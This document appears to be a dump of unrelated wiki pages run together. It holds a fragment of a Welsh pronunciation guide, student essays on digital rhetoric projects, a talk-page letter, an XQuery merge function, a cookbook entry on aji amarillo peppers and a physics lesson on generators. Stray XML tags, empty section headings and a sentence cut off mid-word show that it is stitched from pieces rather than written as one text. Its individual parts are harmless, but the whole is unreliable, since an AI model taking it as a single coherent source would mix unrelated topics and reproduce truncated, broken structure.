*However, if the first is something else, such as ''cefn'', take the vowel that comes before the duo and stick it ''in between the two''. E.g. ''cefn'' would be pronounced ''kevv-enn''.
*If there are ''two'' vowels before the duo, just repeat the last one. So ''eifl'' would be pronounced ''ay-vill''.

==The End==
Congratulations, you can now pronounce just about every Welsh word by careful application of the above rules. I won't deny that there are some exceptions, which are listed below. Although the ruleset may seem cumbersome, Welsh is actually a surprisingly logical language and it's a lot tougher the other way round (the pronunciation ruleset for English would be MASSIVE).

==Exceptions==

== Remixing Portfolio ==

I designed an online portfolio to display my top design pieces in graphics, print publications, and websites. Through digital rhetoric and with the assistance of the Animoto website, I was able to create a remix using these portfolio pieces. By using the new and exciting elements of digital rhetoric, I am able to display my work in a more much dynamic fashion. Instead of future employers viewing my portfolio pieces as a flat static image, there is an exciting introduction with video, text, and movement of the images. This new discovery is more than just an average slideshow. It allows me to choose my “spotlight” images, which the remix will focus on during the 30 second clip. The Animoto website does this spotlight feature by shadowing these particular images or creating different affects to emphasize the importance of these images more than the others. This individual project provides an excellent example of how digital rhetoric can change and influence the presentation of what were once static items.

== Mosaic: Implementing Elements of Digital Rhetoric ==
Created by Sara A. Lari

Throughout the semester, we have been trying to narrow down a definition of “digital rhetoric.” As a group, we narrowed down to something along the lines of the following statement: “elements of persuasion that work together in a digital world.” For my individual project, I wanted to work with the idea utilizing the concepts of visual rhetoric, authorship, context, and hyperlinks. At first, it was challenging coming up with a project that implemented elements of digital rhetoric. However, as time progressed, I decided to create something where I could educate my audience. The topic assigned to our group was Remediation and Remix, and I wanted to create something within those lines. I chose to create a mosaic of a famous architectural building. I decided to use a software called mosaic creator and uploaded an image of “Burj Al Arab,” the second tallest hotel in the world. It is famous worldwide for its unique architecture, as it resembles a billowing sail. I chose “Burj Al Arab” because I was born in Dubai, United Arab Emirates; I wanted to make the project personal. In order to create the mosaic, I used over 800 of my personal pictures. With the aid of the software program, I was able to create a mosaic-like piece. Essentially, my personal pictures became tiles, and created the mosaic while mimicking the original picture. The more pictures I used, the more accurate the mosaic appeared.

Now, in order to make it relevant to digital rhetoric, I decided to incorporate a hyperlink pertinent to architecture in each tile. However, due to time constraints, I was unable to attach a hyperlink for each tile present in the mosaic. For time being, I am going to be dividing the mosaic in six different parts. Each part is going to comprise of several hundred tiles, and I will attach one hyperlink, collectively. The idea is that once people scroll over each tile, they will be sent to a website containing information related to architecture or some interesting facts about the architectural building.

The idea is that in order to educate people about a certain topic, a mosaic can be used to aesthetically appeal to the audience. In addition, people can personalize the mosaics by using their own pictures, or if they feel uncomfortable with that option, the mosaic creator website offers packages with over a thousand pictures. Within the mosaic, hyperlinks can be incorporated to make the project more interesting, so that when people click on the tiles, and they are directed to a website or anything relevant to the mosaic. This tool could be implemented in classrooms, universities – the possibilities are infinite.

I really enjoyed working on this project, and I had a chance to actually implement and apply all the different aspects of digital rhetoric that we learned this past semester.

Here is the link to the my project: [http://www.pz-writing.net/luna/Mosaic-hotlinks.html Mosaic: Implementing Elements of Digital Rhetoric]

== Basics of Digital Rhetoric in a Wiki Format ==

'''Overview of the Site'''

For my final project I created a web page on wikispace, this site provide an indication of Digital Rhetoric and other related topics that I have  learned in Digital Rhetoric class. The Main page of my site is the home page, which I describe the content and descriptions of the site. For each significant, I created individual pages. Each individual page will provides a summary and description about each topic. Along with the description I included a link to an important term on each pages. On the other hand I included videos and images to provide visual details on each topic. 

This site mainly was created to inform users about Rhetoric and other important topic that we have discussed in digital rhetoric courses throughout this semester. The main point that I want to emphasize in this page is Digital Rhetoric. Most of us are unaware about the important of digital rhetoric and how it dominates public affairs, educations, organization and any other task that involves digital media or web. Whenever we go on a computer we use some form of Digital Rhetoric, but we might not know about it. Digital Rhetoric will advance as technology move forward especially digital rhetoric that involves web. On this wiki page I will create separate page for each topic that are a concept of digital rhetoric. On each page it I will provide a brief description and also provide links, videos, images that consist on each topic. 


Throughout this semester we have learned about significant roll of digital rhetoric. One of the fundamental concepts of this course was relationship between classical and digital rhetoric. Classical rhetoric is the foundation of rhetoric; however since technology advance rhetoric was adapted to be used in digital media and webs.

First I describe and defined the term “digital Rhetoric” a page is created for this topic since it’s the main point of this project. Authorship also an important topic that we defined and described throughout this semester which, I think it’s an imperative note to be included in my site. Collaboration, Second Life, and Web 2.0 are also important terms that related to digital rhetoric, which is why individual page was created for each of them. This project also related to digital rhetoric the way collaborate, share ideas, define authorship, and how technology advanced digitally. 


Creating this was challenging and time consuming however it was a great experience. This project refreshed my memory on the important topics that we have learned in this class. This class also provided me an important role of digital rhetoric and how it outlined our academic life.

== The Summer of '06 ==

I created a bodyboarding video titled [http://www.facebook.com/v/677373206579 ''The Summer of ’06''] that represents digital rhetoric in many different aspects. This video uses mixed media by incorporating text, music, images, and video clips, as well as hyperlinks. All the pictures and video clips were original photographs and video clips taken back in 2006. Authorship is the first and most prominent feature of this video. It has been put together solely by me and posted onto the social networking site Facebook, for the world to see and comment on. Viewers have the ability to post comments on this video through Facebook and also “tag” people or anything they want to identify in the video creating an interactive experience. Through this digital mean, my video is shared with the world with a click of a button and potentially informs thousands of people about ''The Summer of ’06''.

Remix and remediation are other aspects of this video portraying digital rhetoric. Instead of just a normal video with original audio clips from the beach I have taken the original audio out and overlaid music as the background. The music, if you listen to it carefully while viewing the video, highlights some points of the video with phrases and sounds that are similar to what is being shown or experienced at the moment a picture or clip is shown. I slowed down, sped up, and froze certain images or clips in order to make them more interesting apart from their original forms. I applied filters to change the way in which some video clips and text appears especially with the opening and closing scenes. Transitions between scenes turn a normal slideshow into a remixed version, creating a connected video rather than chopped up video. I used Photoshop to alter the picture of Goodale Productions from its original plain lettered appearance and inserted it into the credits. I recorded original music within the closing credits. After recording the song, I remixed it by applying enhancements (cleaning the sound, changing the equalizer, adding additional stereo sound, and fading).

I originally uploaded my video to YouTube with the intention to add hypertext to it. However, YouTube flagged my video as being a copyright infringement due to the music I used by the band Nonpoint. I was going to insert hyperlinks on the video using the annotation editor option YouTube recently created. Hyperlinks would have allowed viewers to go to other places on the internet which are relevant to my video, further than my physical video could have shown them. I ended up uploading my video to Facebook instead, which killed my idea of hypertext but it still gets the point across, enjoy!

== Bass Guitar lesson for Blitzkrieg Bop by the Ramones ==


The site on youtube is http://www.youtube.com/watch?v=Pu4sR86tIL8

If you like what you see please comment.

We have been studying the whole semester what digital rhetoric is. My section was how to tell the difference between composing and writing digital texts. That was my group project and now we have our own individual projects to do. I decided the best approach would be to make a Youtube video online. People use Youtube to teach, to entertain, and to express. I am finally getting to do a more personal video than my past one that is just a humor video.  This new video is made so that I can actually try to help people who want to pick up the electric bass and learn a song. I myself am a beginning bass player just trying to learn the instrument, and I thought maybe there are other bass players out there who are looking for popular and recognizable songs to learn how to play. Blitzkrieg Bop by The Ramones was actually the first song I learned all the way through and I feel like others would benefit from someone showing them what notes to play and how to play them.

From this project I have now showed the world a little something that I know. People can now watch this video in China, Japan, Iceland, England, and etc. Youtube is an ever-expanding web of personal ideas and views. It allows people to place their thoughts and opinions on the Internet for others to see and then comment back. The comments can be good or bad but not everyone in the world will like what we put up on Youtube. That is the beauty of it; we can see the good and the bad and learn from those comments. The possibilities are endless as to what we can add and remix.

In the future I might add more lessons of songs I have picked up along the way and add more videos.  Unfortunately with Youtube being such an enormous web, it does have to ability to get lost in the mix. If that does happen though it really does not bother me because I know it is there and if I want people to see it I will find a way to for them to access it. Right now the class can see the video easily because I have put it on the blog as a hyperlink where all you need to do is click and it will take you there with no effort or time lost.

I did learn a lot from the class in terms of what we can do with the right tools. With something like flickr we can post pictures endlessly for people to follow our footsteps day to day, or we can use twitter and update our location, feelings, and ideas. Coming in to this class I had no idea what to expect but after finally doing projects and seeing what others do regularly I have learned that we can voice ourselves easily and find other people in this giant world who think and feel the same just with a click.

== Egypt in Hollywood ==

Egypt in Hollywood, A blog about the pros and cons of antiquity films
http://keithaharmon.wordpress.com/

-------------------------------------------------------------------------------------------------

Over the semester TSC 690 has focused on the meaning and methods of digital rhetoric. When I started this course, I was not sure what digital rhetoric really was; however, after the class discussions, readings, and projects, I am confident that I could explain the topic. 

For my individual project, I wanted to create an example of digital rhetoric using my wikibook topic of hypertexts and hyperlinks. My individual project is a blog that incorporates several elements of digital rhetoric:
*Remediation
*Social interaction
*Hyperlinks
*Hypertextual elements

'''Remediation'''

My blog is a remediation of an old paper I wrote on how Hollywood portrays Ancient Egypt. The original paper was a typical report starting with a hypothesis, clear headings, and citations. For my final project, I decided to turn the paper into a blog. I used the main headings as a starting point, and I began writing short posts based on the topics in the paper. Because a blog format is very different from a report, the posts do not follow the paper word for word. 
 
'''Social Interaction'''

The purpose of a blog is to encourage social interaction. I use persuasive language and controversial topics to encourage social interaction within my blog. 


Because I only had about two weeks to complete this project, there are very few comments on my posts. To increase social interaction I have considered two methods. For the first method, I would visit similar blogs and begin to interact on other sites and then I would leave a link to my site on my posts. This method would encourage people with similar interests to visit and respond to my blog. The second method for encouraging social interaction would be to register my blog on sites such as technorati.com and blogcatalog.com. Registering my blog would make it easier to find and could

'''Hyperlinks'''

Hyperlinks are the foundations of hypertexts. I used hyperlinks throughout my blog, linking specific words to Wikipedia.com, dictionary.com, and content specific websites.  Because my topic is very specific, I decided to include links that can take the reader to other sites and allow the reader to research topics they are not familiar with. 

'''Hypertextual Elements'''

There are levels of hypertextuality. In Hypertext 3.0, George Landow defines a true hypertext as
combining linked texts and images, having no beginning and no end, containing many entrances and exits, interacting with users, being unpredictable, being discontinuous, not being linear. My blog is not a true hypertext; however, there are several hypertextual elements to my project. My blog includes mixed media, social interaction, hyperlinks, and non-linear discussions.

'''Conclusion'''

This semester has opened my mind to new technologies on the Web. Working on my wikibook topic and this final project has been a great learning experience. Please feel free to look through my blog and post comments. You can view my final project at http://keithaharmon.wordpress.com/.






== Volunteer New Orleans == 
                                               
*'''My Project'''

My individual project was created in wordpress a free blogging site.  This was a perfect host from my project because it let me post journal and essay style entries to give background information and provide links to other site for more information.  For my project please see [http://volunteernola.wordpress.com/ Volunteer New Orleans].  



*'''Digital Rhetoric Today'''

The purpose of this project was to create persuasive and informative visual rhetoric that leads readers through the city of New Orleans experiences and my volunteer experiences pre and post Hurricane Katrina.  I hope that by the completion of this project I can educate and inform people on the affects and aftermath of Hurrican Katrina.  Most importantly that there is a long way to go with the rebuilding stage and volunteers are always welcome.  So my goal is to become an advocate for what I saw during my time as a volunteer and what I still see needs to be done.  Certainly, I know I am no expert on the topic but I hope that we can learn together to rebuilding NOLA.  By creating a project about New Orleans it has allowed me to reach a broader audience with more tools available to help recreate my experiences online through hyperlinks, texts, images, movies, blogs, social interaction, and sounds.

*'''Social Action'''

We can take steps together.  Simply by educating yourself on the world issues today is taking the initiative for social action by becoming an informed citizen.  Become a volunteer, access the site to find out other's volunteer experiences and how you can become a volunteer.  Donate, find a way to give back without actually having to go down to NOLA.  There are plenty of nonprofits struggling everyday to receive funding, and this is a great way to support with furthering achieving their mission.  Comment, post, and learn, social action taking shape by interaction, educating, and sharing knowledge.

*'''Conclusion'''

I truly have had fun with this project and enjoyed the opportunity to take what I have learned and apply it to an educational project.  There is a lot of information to sift through to help take this site reach its potential.  With each trip, the more photos and stories I will have to share and with more volunteers hopefully the more updates on progress I can report back on.



== Why YOU Should Come to JMU (based on Common Craft)==

For my [http://www.youtube.com/watch?v=sH7Jz3TY3h8 individual project], I created a video for prospective students indicating why they should attend JMU. The short film is based on the Common Craft series, a husband-and-wife team who makes instructional videos for various topics from social media to investing.

*'''Digital Rhetoric in General'''

How does my project relate to digital rhetoric? First, let’s review what the term digital rhetoric means. In a previous class, it was defined as “the way in which persuasion and communication function and work in digital environments.” Traditionally, prospective students who are unable to make the trip to JMU learn about it through brochures, word of mouth, or looking at the university Web site. While brochures offer pictures and the Web site offers a breadth of information, these forms of media do not stand out as well because other schools use the same tools. Word of mouth has its benefits, but it can only do so much. However, with this video, digital rhetoric (more specifically, the art of persuasion) is clearly illustrated through the content of the video “Why You Should Come to JMU.”  Not only does the video showcase a Top 5 list (an influential tool), but it also takes a creative approach to deliver the point.

*'''Intellectual Property'''

One concept of digital rhetoric that my individual project touches on is intellectual property. In his book, Free Culture, Lawrence Lessig discusses the stringent copyright system and how it inhibits the progression of spreading knowledge to and promoting creativity for others. Creative Commons responded to the call to action, and many corporations have jumped onboard to allow the public to “share” their creative work, including Common Craft. If Common Craft would not have obtained a “Some Rights Reserved” copyright, I probably would not have been able to remix their video to tailor it to my audience. Their license does indicate that whoever uses their work should attribute them and use it for noncommercial purposes. In the title slide of my video, I wrote that my presentation was based on Common Craft, and I even included their logo. I also stated this in the video description on the YouTube site.

*'''Remix'''

A second concept of digital rhetoric that the video includes is the art of remix. Remixing involves creating a new, alternate version of an original concept. For example, my video is a prime example of remixing, because I used the Common Craft idea of using 2D imagery, audio, and animation on a whiteboard background to illustrate my point.

*'''Visual Rhetoric'''

A third component of digital rhetoric depicted in my video is that of visual rhetoric. Christine Alfano, professor at Stanford University, defines visual rhetoric as “a form of communication that uses images to create meaning or construct an argument.” The entire video is filled with visual rhetoric, and its goal is to convince prospective students that JMU is where they belong. For example, the picture of the sea of students in Bridgeforth Stadium illustrates that students genuinely care about JMU, especially if they flock to football games in such high numbers.

*'''Conclusion'''
Overall, I thoroughly enjoyed working on this project, and I’m pleased that I was able to demonstrate several concepts of digital rhetoric.


== ''Many Souths: Civil War era Southern perspective does not = Confederate perspective'' == 
Created by Robert Moore
                                               
*'''''Many Souths'' as a form of digital rhetoric'''
My final project — ''[http://manysouths.wordpress.com/southern-perspective-confederate-perspective/ Many Souths: The Civil War era Southern perspective does not = Confederate perspective]'' — was developed based on my understanding of the definition of '''''digital rhetoric'''''. In short, my definition of digital rhetoric is to create persuasion, using the affordances of the digital space, within the digital environment.

*'''Format for ''Many Souths'''''
In its present form, ''Many Souths'' is a prototype for a website. Furthermore, though I take advantage of the [http://wordpress.com/ WordPress.com] blog format, ''the site is not a blog''. No posts have been created for this project. Rather, I have used the page creation function to create the prototype. As readers can see in the sidebar, there are 32 pages divided among four different tiers.

As elements of my digital persuasion, I have included non-social interface elements (internal and external [http://en.wikibooks.org/wiki/Digital_Rhetoric/Hypertexts_and_Hyperlinks#Hyperlinks hyperlinks]) as well as [http://en.wikibooks.org/wiki/Digital_Rhetoric/Genres_and_Media#Visual visual] imagery. Though the site is designed to “funnel” readers through my digital rhetoric presentation, and this “funneling” does not fit some theorists’ definition of [http://en.wikibooks.org/wiki/Digital_Rhetoric/Hypertexts_and_Hyperlinks#Hypertexts hyptertext], it is still a hypertext. If the internal hyperlinks are followed within the individual pages, it is a linear presentation, however, the sidebar allows entrance to the pages at any point in the presentation. I have also retained comment boxes (a common feature of blogs) to permit '''''social interaction''''' with readers to fulfill expectations of the environment of '''''Web 2.0'''''. I will retain comment boxes in the design of the webpage for that same purpose. Ultimately, the hyperlinks, visual imagery, and narrative offer [http://en.wikibooks.org/wiki/Digital_Rhetoric/Composing_with_Words#Traditional_Written_Media_and_Mixed_Media a different avenue of learning through mixed media].  

*'''Objective of ''Many Souths'''''
The objective of this project is to persuade others that, as opposed to the beliefs of some, the Civil War era South is not defined by one perspective alone, but by many. 

*'''Developing the persuasion: The pages of ''Many Souths'''''
The first page — [http://manysouths.wordpress.com/southern-perspective-confederate-perspective/ Southern perspective = Confederate perspective] — sets the stage for the persuasion, establishing that there are people who believe that Southern perspective is defined by the Confederacy. The second page — [http://manysouths.wordpress.com/southern-perspective-confederate-perspective/southern-perspective-version-10/ Southern perspective, Version 1.0] — puts symbols in [http://en.wikibooks.org/wiki/Digital_Rhetoric/Context context] for the audience in order to reinforce the suggestion that Southern culture has come to be defined by images such as the Confederate flag and, therefore, might help readers understand how the memory of Southern culture has come to be defined in terms of Confederate imagery. The third page — [http://manysouths.wordpress.com/southern-perspective-confederate-perspective/southern-perspective-version-10/civil-war-era-southern-perspective-from-the-bottom-up/ Civil War era Southern perspective from the “bottom-up”] — suggest that we should no longer look at the history of the Civil War era South as defined under the generalization that the war was a sectional conflict. Instead of looking at the war as North vs. South (Union vs. Confederacy), or from the “top-down,” we should begin to look at the war from the perspectives of the many people who lived in the South during the war. When we begin to do this, we realize that the people of the Civil War era South had many varying perspectives. To enable this understanding, the persuasion is carried to the next level by '''28 different perspectives''' of Southerners during the Civil War, none of which could be defined as part of the “Confederate perspective,” but all could be included among Southern perspectives of the war. The final page — [http://manysouths.wordpress.com/then-southern-perspective-or-southern-perspectives/ Then… “Southern perspective” or “Southern perspectives?”] — closes-out the argument.

== Applying Components of Digital Rhetoric to a Wedding Blog ==

Created by Elizabeth H.


For my individual project in TSC 690 Digital Rhetoric, I wanted to create something that I would use after the conclusion of this class. As a WRTC graduate student, I have had the opportunity to work on a variety of print and electronic projects. I focused my graduate studies on project management, instructional design, and the usability of print and electronic texts. Thus, I decided to create a planning and communication tool that will help my fiancé and I plan our wedding scheduled for October 2010. This tool is a blog, [http://erholena.wordpress.com/ Getting to Happily Ever After: The Official Blog of Elizabeth &amp; Neal’s Wedding.]


I was inspired to create and maintain a blog, as opposed to a website, because it allows for social interaction and collaboration, two important components of digital rhetoric. A blog allows me to post text in the form of words, photos, videos, and links. This text can then be read and commented on by others allowing for the exchange of ideas. This feature of the blog is particularly helpful for planning a wedding, which is like managing a large documentation or Web project. The blog permits me to post my plans and resources in one central location where my fiancé and I can discuss our options. 


Before I created my wedding blog, I was making lists, pasting links and photos, and jotting down ideas in a Microsoft Word document on my desktop. I could not share the Word document with my fiancé in real-time. If I wanted to show him something or run something by him, I had to send him an email or call him and say, “Hey I need you to check this out!” This routine was frustrating and inefficient. As a technical communicator, I strive to find effective solutions to problems—a Word document was not the answer. 


The most important reason why I created this blog is for its accessibility. I could have easily made a Facebook page by posting text, photos, and links; however, not everyone in my bridal party and family has a Facebook account. The blog enables me to not only communicate with my fiancé, but also with my bridal party and family. It is important to me to involve my family, especially my mom and grandmother. This blog allows them to view my plans and provide feedback or suggestions—my Aunt Karen in Chicago, Illinois is just as connected as my Aunt Kathy in Bel Air, Maryland. 


I would have never thought I would be able to create and maintain a blog until taking this class. I enjoyed applying the various components of digital rhetoric (i.e., authorship, context, remediation, intellectual property, social interaction, collaboration) to texts, both print and electronic. I have more confidence in my ability to talk about and learn new tools/media. I especially enjoyed our class discussions on authorship and intellectual property law. These topics are important to our field and will continue to be controversial areas of discussion in the future. I also learned so much about rhetorical theory. Going into this class, I had little to no knowledge of rhetorical practices. Now I feel confident that I can apply traditional rhetorical practices (or at least talk about them) to electronic texts. This will be an excellent asset for me going into the field of instructional systems design.


==Teaching and Learning Context==

Write-up and my interpretation of the exercise:
Throughout the semester we have looked at different elements that revolve around digital rhetoric.  The one that has jumped out at me is the idea of context. Context is the topic that I worked on developing for the wiki along with my partner Christy. We developed a well written page that highlighted the important ideas of context and explained why we feel it is always changing. We also looked at how web 1.0, 2.0, and 3.0 are related to context along with hypertext. 
I wanted to focus more specifically on the context of an image for my individual project and decided to develop a class activity that could possibly be used in a future class of TSC 480. The goal of this activity is show students that by using the technology that is available to them today to manipulate or change a photo can change the overall context and message of and image. I used adobe Photoshop to change make the original image black and white. The reason I chose black and white was so that when student looked at the image they would just see the chaos going on and might be able to understand the true intent of the image. The original image is in color and they dye sample used it red, which bring a morbid vibe the first time you see the image because instantly you think its blood. After taking a closer look at the image you can see that it is an advertisement for Diamond Dyes and the young girl in the advertisement has gotten into her mother’s dye by ruining her doll and dying the family cat in it as well. In a  sense by removing the color from the image and making it black and white it is actually easier to see that it is an advertisement for dye because you can look past the initial misconception that this image is the young girl killing the cat, only because the red stands out so violently. This is why I asked the question to students, would the interpretation have been different if the color blue was substituted for red. I think so because it would not be mistaken for blood and blue would be an unusual color to see on a cat or doll. The same message to buy Diamond Dyes would still be present in the image.
I am very happy with my individual project and would be very interested to see how this activity would play out in a classroom of students studying digital rhetoric.

== How to Bake a Cake: An Example of Digital Rhetoric ==

[http://www.youtube.com/watch?v=zEYYgBwHeV8 How to Bake a Cake: An Example of Digital Rhetoric]


Our project is a how to video. The object of our video is to show how putting visual, audio, and text rhetoric together makes digital rhetoric and how those processes enhance learning. Each form of rhetoric helps with different styles of learning and better understanding of concepts. This is a simple idea to attempt to explain a complicated concept. 


Visuals are a great way for quick persuasion and comprehension. They are able to offer a demonstration, an argument, an emotional appeal, and occasionally, a mix of all three. However, visuals also leave ground for misinterpretation. Often just a visual means that each person may find a different meaning in it than what the author intended. 

Audio is an excellent form of persuasion as well because it gives the audience the opportunity to chose a different form of media to learn a process. For those individuals that are audio learners this video is an excellent way to learn how to bake a cake. Audio can oftentimes portray a more powerful and persuasive message. Voice inflection, music, sound, and other forms of audio media can have a moving effect on forms of presentation. Audio along with visuals and text are prime examples of how collaboratively they can have a large impact on the world of digital rhetoric  


The text is helpful for many different reasons. If someone cannot hear, or has a hard time hearing, then they can see the step-by-step instructions. If the audience did not hear the audio part, or forgot what was said, then they can rely on the text to figure out what they missed. In the digital world, users can change the text's size, shape, color, and even language.  Using those different techniques, we can alter the video so it can reach a much larger audience. 


The collaboration of these different types of media allows users to decide which way they would like to learn the process. This could be helpful for those individuals that are specifically audio or visual learners. Collaborative media essentially gives people the option of how they would like to learn a process and if they choose to it also allows them to read, listen, and watch to get a thorough understanding of how to complete the cake baking process. This concept can also be applied to other more complex ideas to help an author portray his or hear meaning to an audience.  Overall, this video is a representation of the use of collaborative media and which is a perfect example of digital rhetoric and the different types of genres (video, audio, and text).

==Remixing The Boondock Saints==
The movie The Boondock saints is a story about two twin Irish Brothers that thing they have been chosen to rid the world of evil, by killing and eliminating Russian thug and mob members in boston.  Before killing their targets, the brothers recite a prayer to more or less tell God that they are doing this for him. The movie itself is packed with rhetoric as the two brothers are constantly running away from an opera-loving FBI agent, who in the end, is forced to decide between bringing the brothers in or joining their cause.  

The purpose of my link is bring the infamous prayer off the screen and into the digital world.  The clip includes visual images, text, music and themes from the movie to bring together the idea of the prayer and the purpose of the movie.  Remixing is a new and tricky form of digital rhetoric, but it eliminates the limitations that one genre can impose on digital pieces.  When remixing, I was not limited to just words or pictures, but I could use all the elements of all the genres to make a new piece.  Remixing will prove to be an constantly growing genre of digital rhetoric as technology becomes more advanced and people start moving into the new digital world.

      <text xml:space="preserve">The Interactive Media Wiki you refer to was created a few years ago by students in my courses.  They were assigned to topics and graded on their input.  This class meets once per year from January to May, so there is a always a lull between edits.  We welcome your thoughts and have no limitations on these pages, other than keeping the focus on emerging media communication topics.  Tools, trends, theories and interactive projects are all appropriate.  All of the topics you mentioned are highly relevant.

I would be interested to learn more about your background.  My interest in this area started about 1980 when I launched a music technology program at our university.  This lead to the integration of other kinds of new media including video, audio, virtual reality, online social networking, wiki groups, etc.  My background is music performance, but my current interests focus on all interactive media including 3D virtual environments, high def. imaging, 3D sound, etc.

What are your interests?

I started an informal unpaid creative exchange several weeks ago with a high school classmate who is a film producer, giving advice on how to market his ideas as internet web series. I did some preliminary research on internet web series and offered a summary along with my perception of the emerging market and viral marketing.

I think my efforts were poorly received; he just didn't get the theory and disputed me on, I think, irrelevant points. Since then, I heard Andros Sturgeon as a call-in guest on a public radio talk show on my regional radio station and realized, here is a producer and fellow Oregonian who clearly does get it, son of writer and fellow former Oregonian Ted Sturgeon whose work does indeed represent many different points of view.

'It' is simply shorthand for a new paradigm for distributive and collaborative media that bypasses the advantages of monopoly and even to a certain leveraging of wealth and profit. Most pertinently, traditional media sectors vastly underestimate popular resentment at and undermining of manipulative, authoritarian, costly, censored and biased content.

You've probably guessed I'm a marketer of some type. I did incidental arts marketing on a very small scale for several years and marketed a co-op natural foods store for three years while a freelance graphic designer. It never sat well with me and I've long been searching for a collaborative business model which preserves individual creativity, license and democratic or consensual process. One might think a co-op might be a suitable place; however my co-op (along with many others) was quickly dropping such models in favor of traditional corporate hierarchy.

Previous to all that, I've been many things, a journalist, sculptor, anthropologist but primarily academic in my thinking while trying to make an ethical living as a writer and consultant. Recently I resigned a full time job marketing the co-op and then suffered a neck injury which has severely limited my work practice. I make a very small amount selling used books and I have a poetry book coming out, but good paying income has dried up. Luckily I now live rent-free and can garden and sell and perhaps even teach or consult locally on a cooperative basis, but as a business I don't think I can follow a traditional model anymore--stress to my injury and lack of creative liberty being the main objections.

I also do feel I have something to say. Magical consciousness has long been an interest of mine, for instance. I did my undergrad thesis on it and feel I have insights (it might be summarized as application of perception psychology and structuralism to belief). I am also very interested in construction of gender and its psychological implications, following Freud and Dorothy Dinnerstein.

So, to get to the point I have thought of publishing, which I have experience in. However, I have determined traditional book publishing a difficult if not retrograde model. I have few academic connections and no higher degrees. I find myself more and more leaning to Wikipedia as my ability to gather print research materials wanes. In order to simply consider myself a relevant and working scholar and critic, I have decided to jump in as a volunteer. At least I will be tied into a more research-oriented community and free of my own marketing costs and imperatives. I still have hopes for a book or teaching or consulting work down the road, and maybe the research will lead to contacts as well as knowledge.

Sorry for the length, respond with comments welcome,

== Collating ==

Alternatively, two ordered lists can be collated to derive a set of updates. Here the items are wrapped in a div to carry the added information about the merge.  Items in list1 but not list2 are flagged as new, items in list 2 but not list 1 as to be deleted and items which are newer in list 1 than list 2 as newer.


&lt;source lang=&quot;xml&quot;&gt;
declare function local:merge($a, $b  as node()*)  as node()* {
    if (empty($a) and empty($b))
    then ()
    else  if (empty ($b) or $a[1] lt $b[1])
    then  (&lt;div class=&quot;add&quot;&gt;{$a[1]}&lt;/div&gt;, local:merge(subsequence($a, 2), $b))
    else  if (empty($a) or $a[1] gt $b[1])
    then  (&lt;div class=&quot;delete&quot;&gt;{$b[1]}&lt;/div&gt;,local:merge($a, subsequence($b,2)))          
   else   (&lt;div  class=&quot;{ if (xs:dateTime($a[1]/@dateTime) gt xs:dateTime($b[1]/@dateTime))
                          then &quot;newer&quot; 
                          else &quot;older&quot;}&quot;&gt; 
              {$a[1]}
           &lt;/div&gt;,
            local:merge(subsequence($a,2), subsequence($b,2))
           )
   };
&lt;/source&gt;

Hallo Electro, 

# I've noticed you have removed version tags an two pages I have written. [[Blender 3D: Noob to Pro/Coordinate Spaces in Blender]], [[Blender 3D: Noob to Pro/Understanding Coordinates]]. Though it is questionable whether they are necessary on these two pages, I think they are necessary in general and should be kept on every page. 
# You have removed non breakable spaces (&quot;&amp;amp;nbsp;&quot;). I have added these by purpose, so that the '''Img.''' and the number will not be wrapped apart.

Thank you for your corrections.

'''Aji amarillo''' peppers are a variety of [[Cookbook:Chili pepper|chili pepper]] commonly used in [[Cookbook:Cuisine of Peru|Peruvian cooking]]. Aji amarillo peppers have a distinct, somewhat fruity taste and are considered moderately hot, registering around 40-50,000 units on the Scoville scale. 

Although ''aji amarillo'' is Spanish for &quot;yellow pepper,&quot; they may vary in color from yellow to orange as the seed pod matures.

Aji amarillo peppers may be purchased fresh, frozen, or as a puree.</text>

      <text xml:space="preserve">[[Image:RightHandOutline.png|thumb|right|200px|Fleming's right-hand rule]]
We have seen that a change in flux induces an electric current in a coil of wire. One way of changing the flux is to move the magnet. Alternatively, we can move the coil relative to the magnet. Generators work on this principle - a non-electrical source of energy is used to rotate something (known as the rotor), which induces an electric current in either the rotor or the stator (the stationary part of any electromagnetic machine). For a generator, the relationships between the directions of current, field and motion are given by Fleming's right-hand rule (right).

==Moving Coil==
===AC Generator===
[[Image:NSRW_Simple_Alternating_Current_Dynamo.png|left|thumb|200px|Attaching carbon brushes to a ''slip''-ring commutator results in an AC generator.]]
If a coil of wire is placed in a magnetic field and rotated, an alternating (sinusoidal) current is induced. As it rotates, sometimes it is 'cutting' through lots of flux, and so lots of current is induced. At other times, it is moving parallel to the flux, and so no flux is cut, and no current is induced. In between, some current is induced. This creates an alternating current.

Either end of the coil can be connected to wires outside of the generator in order to use the current elsewhere. This would be fine for the first few rotations, but after this, the wires would get tangled up and the generator would be useless. To avoid this, we use a commutator. In an AC generator, this is a pair of rotating conducting 'slip rings' attached to either end of the coil. Carbon brushes bring these into contact with the outside world.

===DC Generator===
[[Image:NSRW_Simple_Direct_Current_Dynamo.png|left|thumb|200px|Attaching wires to a ''split''-ring commutator results in an DC generator.]]
If we replace the slip-ring commutator in an AC generator with a pair of brushes which the ends of the coil rotate inside, the generator creates direct current (DC) instead. Halfway through the rotation, the brushes come into contact with the other end of the coil, and so the AC changes direction every half a rotation. This approximates to a direct current. This direct current is not perfect since it consists of a series of positive-voltage pulses. These pulses can be smoothed out using a capacitor or a complex system of commutators.

==Moving Magnet==
===Simple AC Generator===
An alternative method of generating an alternating current is to rotate a permanent magnet in a gap between two coils. This has the advantage of not requiring a commutator (the coil is the stator), but often a coil is lighter than a magnet, and so it is more efficient to use a rotating coil.

===Three-Phase Generator===
If we place three pairs of coils, evenly spaced, around the rotating magnet, then three different alternating currents, with three different phases, will be generated. This is a more efficient method of generating electricity, since current is always being generated. The sum of all three currents is zero, so three different cables must be used to transport the currents. Three-phase power is often used in motors with three coils in the stator.

==Questions==

1. Draw diagrams of an alternating current, the 'direct current' produced by a DC generator, and this current once it has been smoothed with a capacitor.

2. What is the phase difference (in radians) between the voltages produced by a three-phase generator?

3. According to Faraday's law, what three things will increase the amplitude of the emf created by a generator?

4. If an albatross touched two power cables carrying AC in phase, what would happen?

5. What would happen if the two cables carried three-phase power?

'''2. What is the phase difference (in radians) between the voltages produced by a three-phase generator?'''

&lt;math&gt;\frac{2\pi}{3}^c&lt;/math&gt;

'''3. According to Faraday's law, what three things will increase the amplitude of the emf created by a generator?'''

&lt;math&gt;\epsilon = -\frac{dN\phi}{dt}&lt;/math&gt;

So, more coils, a stronger magnetic field or a higher frequency of rotation will increase the amplitude of the emf.

'''4. If an albatross touched two power cables carrying AC in phase, what would happen?'''

Nothing - there is no potential difference between the two cables.

'''5. What would happen if the two cables carried three-phase power?'''

Unfortunately, dead albatross - there is potential difference between the two cables.

==Pests and Pest Control==
